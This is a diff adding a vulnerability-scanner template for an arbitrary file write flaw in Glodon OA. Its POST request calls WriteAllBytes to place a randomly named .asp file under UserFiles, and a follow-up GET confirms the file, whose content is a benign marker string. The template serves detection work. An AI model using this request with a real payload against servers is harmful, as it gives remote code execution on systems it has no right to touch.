@@ -1,0 +1,49 @@
+id: glodon-writeallbytes-filewrite
+
+info:
+  name: Glodon OA WriteAllBytes Arbitrary File Write Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-write, RCE, glodon
+  description: |
+    This template detects an arbitrary file write vulnerability in Glodon OA using the WriteAllBytes method.
+
+variables:
+  random_file: "{{rand_base(4)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: write-file
+    method: POST
+    path:
+      - "/m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=WriteAllBytes"
+    headers:
+      Content-Type: application/json
+    body: |
+      ["\"D:\\\\Program Files (x86)\\\\Glodon\\\\GTP\\\\data\\\\gtp-default\\\\FileStorage\\\\UserFiles\\\\{{random_file}}.asp\"","[116, 104, 105, 115, 32, 105, 115, 32, 97, 110, 121, 102, 105, 108, 101, 45, 117, 112, 108, 111, 97, 100]","false"]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"IsSuccess\":true"
+          - "\"StatusCode\":\"OK\""
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/UserFiles/{{random_file}}.asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "this is anyfile-upload"
